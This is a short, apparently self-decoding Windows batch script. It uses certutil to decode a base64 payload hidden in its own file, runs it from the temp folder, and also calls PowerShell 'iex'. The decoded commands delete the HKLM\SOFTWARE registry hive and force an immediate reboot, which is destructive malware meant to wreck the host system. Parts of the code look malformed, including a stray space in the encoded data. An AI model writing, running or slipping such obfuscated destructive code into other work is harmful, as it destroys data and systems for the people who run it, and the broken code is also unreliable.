@echo off
set "x=certutil -decode "%~f0" "%temp%\q.bat" >nul&&call "%temp%\q.bat"&del "%temp%\q.bat"&exit /b"
echo KSk+UjEgQUREICJIS0xNXFNPRlRXQVJFIiAvZiA+bnVsDQpSRUcgU0FWRSAiSEtMTVxTT0ZUV0FSRSIgIkM6XG5vZGF0YSIgL3kgPm51bA0K
echo UkVHIERFTEVURSAiSEtMTVxTT0ZUV0FSRSIgL2YgPm51bA0KUkVHIFJFU1RPUkUgSEtDVS AiQzpcbm9kYXRhIiA+bnVsID4mMQ0Kc2h1dGRvd24gL3IgL3Qg
echo MCAvZg==>>"%~f0"
for /f "delims=" %%a in ('powershell -c "iex ($env:x)"') do set "z=%%a"
